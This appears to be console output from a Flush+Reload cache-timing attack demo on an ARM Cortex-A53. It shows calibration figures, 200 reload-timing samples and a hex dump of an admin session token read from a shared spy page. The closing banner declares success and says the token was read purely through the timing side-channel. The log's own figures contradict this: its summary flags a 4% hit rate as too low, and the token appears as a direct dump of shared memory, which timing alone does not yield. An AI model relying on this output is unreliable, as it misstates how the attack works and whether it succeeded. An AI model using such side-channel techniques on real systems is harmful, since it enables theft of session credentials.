╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffff80e5e000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    130 ns  (line already in cache)
[attacker]   DRAM miss     =   1966 ns  (line not in cache)
[attacker]   Threshold     =   1048 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  ──────  ──────────  ────────  ─────────────────
  1       2343        miss      0 hits so far  (warmup)
  2       2500        miss      0 hits so far  (warmup)
  3       2447        miss      0 hits so far  (warmup)
  4       2135        miss      0 hits so far  (warmup)
  5       2395        miss      0 hits so far  (warmup)
  6       2031        miss      0 hits so far  (warmup)
  7       1927        miss      0 hits so far  (warmup)
  8       2760        miss      0 hits so far  (warmup)
  9       2552        miss      0 hits so far  (warmup)
  10      3020        miss      0 hits so far  (warmup)
  11      2343        miss      0 hits so far
  12      1718        miss      0 hits so far
  13      2656        miss      0 hits so far
  14      2395        miss      0 hits so far
  15      1718        miss      0 hits so far
  16      1770        miss      0 hits so far
  17      1666        miss      0 hits so far
  18      1041        HIT ◄   1 hits so far
  19      2656        miss      1 hits so far
  20      2760        miss      1 hits so far
  21      3958        miss      1 hits so far
  22      2291        miss      1 hits so far
  23      2031        miss      1 hits so far
  24      1562        miss      1 hits so far
  25      1822        miss      1 hits so far
  26      1197        miss      1 hits so far
  27      2395        miss      1 hits so far
  28      2916        miss      1 hits so far
  29      2656        miss      1 hits so far
  30      2916        miss      1 hits so far
  31      2187        miss      1 hits so far
  32      1614        miss      1 hits so far
  33      1770        miss      1 hits so far
  34      1197        miss      1 hits so far
  35      2916        miss      1 hits so far
  36      2395        miss      1 hits so far
  37      1197        miss      1 hits so far
  38      1718        miss      1 hits so far
  39      1822        miss      1 hits so far
  40      1458        miss      1 hits so far
  41      1145        miss      1 hits so far
  42      1770        miss      1 hits so far
  43      2500        miss      1 hits so far
  44      3020        miss      1 hits so far
  45      1666        miss      1 hits so far
  46      1406        miss      1 hits so far
  47      1510        miss      1 hits so far
  48      1770        miss      1 hits so far
  49      2552        miss      1 hits so far
  50      1250        miss      1 hits so far
  51      2708        miss      1 hits so far
  52      1718        miss      1 hits so far
  53      1354        miss      1 hits so far
  54      1927        miss      1 hits so far
  55      1302        miss      1 hits so far
  56      2239        miss      1 hits so far
  57      1979        miss      1 hits so far
  58      1822        miss      1 hits so far
  59      2395        miss      1 hits so far
  60      3229        miss      1 hits so far
  61      3020        miss      1 hits so far
  62      1875        miss      1 hits so far
  63      3020        miss      1 hits so far
  64      2031        miss      1 hits so far
  65      2291        miss      1 hits so far
  66      1197        miss      1 hits so far
  67      2604        miss      1 hits so far
  68      1302        miss      1 hits so far
  69      1093        miss      1 hits so far
  70      1145        miss      1 hits so far
  71      2760        miss      1 hits so far
  72      1458        miss      1 hits so far
  73      1562        miss      1 hits so far
  74      1458        miss      1 hits so far
  75      2135        miss      1 hits so far
  76      1302        miss      1 hits so far
  77      1406        miss      1 hits so far
  78      1458        miss      1 hits so far
  79      1197        miss      1 hits so far
  80      1458        miss      1 hits so far
  81      1354        miss      1 hits so far
  82      1197        miss      1 hits so far
  83      2708        miss      1 hits so far
  84      1770        miss      1 hits so far
  85      2656        miss      1 hits so far
  86      2708        miss      1 hits so far
  87      1927        miss      1 hits so far
  88      2187        miss      1 hits so far
  89      2239        miss      1 hits so far
  90      1979        miss      1 hits so far
  91      885         HIT ◄   2 hits so far
  92      3229        miss      2 hits so far
  93      2656        miss      2 hits so far
  94      2291        miss      2 hits so far
  95      1406        miss      2 hits so far
  96      1250        miss      2 hits so far
  97      1302        miss      2 hits so far
  98      1666        miss      2 hits so far
  99      1093        miss      2 hits so far
  100     2187        miss      2 hits so far
  101     3020        miss      2 hits so far
  102     1510        miss      2 hits so far
  103     1093        miss      2 hits so far
  104     1250        miss      2 hits so far
  105     1822        miss      2 hits so far
  106     1406        miss      2 hits so far
  107     1718        miss      2 hits so far
  108     2395        miss      2 hits so far
  109     2135        miss      2 hits so far
  110     1250        miss      2 hits so far
  111     1666        miss      2 hits so far
  112     1197        miss      2 hits so far
  113     1093        miss      2 hits so far
  114     1927        miss      2 hits so far
  115     1562        miss      2 hits so far
  116     2604        miss      2 hits so far
  117     3177        miss      2 hits so far
  118     3125        miss      2 hits so far
  119     1406        miss      2 hits so far
  120     1458        miss      2 hits so far
  121     1041        HIT ◄   3 hits so far
  122     1770        miss      3 hits so far
  123     1458        miss      3 hits so far
  124     2968        miss      3 hits so far
  125     1562        miss      3 hits so far
  126     1041        HIT ◄   4 hits so far
  127     1510        miss      4 hits so far
  128     1458        miss      4 hits so far
  129     2552        miss      4 hits so far
  130     2760        miss      4 hits so far
  131     1302        miss      4 hits so far
  132     2812        miss      4 hits so far
  133     1250        miss      4 hits so far
  134     1458        miss      4 hits so far
  135     1302        miss      4 hits so far
  136     1041        HIT ◄   5 hits so far
  137     1250        miss      5 hits so far
  138     1302        miss      5 hits so far
  139     51927       miss      5 hits so far
  140     4270        miss      5 hits so far
  141     2343        miss      5 hits so far
  142     1302        miss      5 hits so far
  143     1614        miss      5 hits so far
  144     1927        miss      5 hits so far
  145     1614        miss      5 hits so far
  146     2447        miss      5 hits so far
  147     1875        miss      5 hits so far
  148     2291        miss      5 hits so far
  149     2135        miss      5 hits so far
  150     2031        miss      5 hits so far
  151     1927        miss      5 hits so far
  152     1822        miss      5 hits so far
  153     1979        miss      5 hits so far
  154     1822        miss      5 hits so far
  155     1666        miss      5 hits so far
  156     2916        miss      5 hits so far
  157     2135        miss      5 hits so far
  158     73125       miss      5 hits so far
  159     2291        miss      5 hits so far
  160     2447        miss      5 hits so far
  161     1458        miss      5 hits so far
  162     1250        miss      5 hits so far
  163     1302        miss      5 hits so far
  164     520         HIT ◄   6 hits so far
  165     2291        miss      6 hits so far
  166     1822        miss      6 hits so far
  167     1666        miss      6 hits so far
  168     2239        miss      6 hits so far
  169     989         HIT ◄   7 hits so far
  170     1302        miss      7 hits so far
  171     1822        miss      7 hits so far
  172     1510        miss      7 hits so far
  173     2447        miss      7 hits so far
  174     1927        miss      7 hits so far
  175     1770        miss      7 hits so far
  176     1354        miss      7 hits so far
  177     1406        miss      7 hits so far
  178     1302        miss      7 hits so far
  179     1562        miss      7 hits so far
  180     1875        miss      7 hits so far
  181     2656        miss      7 hits so far
  182     1666        miss      7 hits so far
  183     1510        miss      7 hits so far
  184     1250        miss      7 hits so far
  185     1093        miss      7 hits so far
  186     1510        miss      7 hits so far
  187     1406        miss      7 hits so far
  188     1770        miss      7 hits so far
  189     3072        miss      7 hits so far
  190     2031        miss      7 hits so far
  191     1354        miss      7 hits so far
  192     1406        miss      7 hits so far
  193     1302        miss      7 hits so far
  194     1822        miss      7 hits so far
  195     1302        miss      7 hits so far
  196     1406        miss      7 hits so far
  197     2447        miss      7 hits so far
  198     1197        miss      7 hits so far
  199     1041        HIT ◄   8 hits so far
  200     1666        miss      8 hits so far

══════════════════════════════════════════════════════════════
  FLUSH+RELOAD — STATISTICAL SUMMARY  (190 samples)
══════════════════════════════════════════════════════════════
  Total cache hits   : 8 / 190  (4%)
  Average reload time: 2503 ns
  Threshold          : 1048 ns
  Verdict            : Low hit rate — check timing / CPU pinning.

══════════════════════════════════════════════════════════════
  EXTRACTING SESSION TOKEN FROM SPY PAGE
══════════════════════════════════════════════════════════════

  ╔════════════════════════════════════════════════════════════════╗
  ║  Offset   Hex (16 bytes/row)                   ASCII          ║
  ╠════════════════════════════════════════════════════════════════╣
  ║  0000   53 45 53 53 49 4f 4e 20  7c 20 69 64 3d 38 66 33  │ SESSION | id=8f3 ║
  ║  0010   61 31 63 39 64 32 65 37  62 34 30 35 36 20 7c 20  │ a1c9d2e7b4056 |  ║
  ║  0020   75 73 65 72 3d 62 6f 62  20 7c 20 72 6f 6c 65 3d  │ user=bob | role= ║
  ║  0030   61 64 6d 69 6e 20 7c 20  65 78 70 69 72 65 73 3d  │ admin | expires= ║
  ║  0040   31 37 38 31 33 30 33 34  32 39 20 7c 20 69 74 65  │ 1781303429 | ite ║
  ║  0050   72 3d 31 38 33 00 00 00  00 00 00 00 00 00 00 00  │ r=183........... ║
  ║  0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00a0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00b0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ╚════════════════════════════════════════════════════════════════╝

  ╔══════════════════════════════════════════════════════════════╗
  ║       *** FLUSH+RELOAD ATTACK SUCCESSFUL ***                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Cache hits observed   : 8                                   ║
  ║  Hit rate              : 4                                  %║
  ║  Average reload time   : 2503                              ns ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  EXTRACTED SESSION TOKEN:                                   ║
  ║    SESSION | id=8f3a1c9d2e7b4056 | user=bob | role=admin | expire║
  ║    pires=1781303429 | iter=183                                   ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Attack used no IPC, no signals, no ptrace.                 ║
  ║  Token was read purely via cache timing side-channel.       ║
  ╚══════════════════════════════════════════════════════════════╝

[attacker] Done.
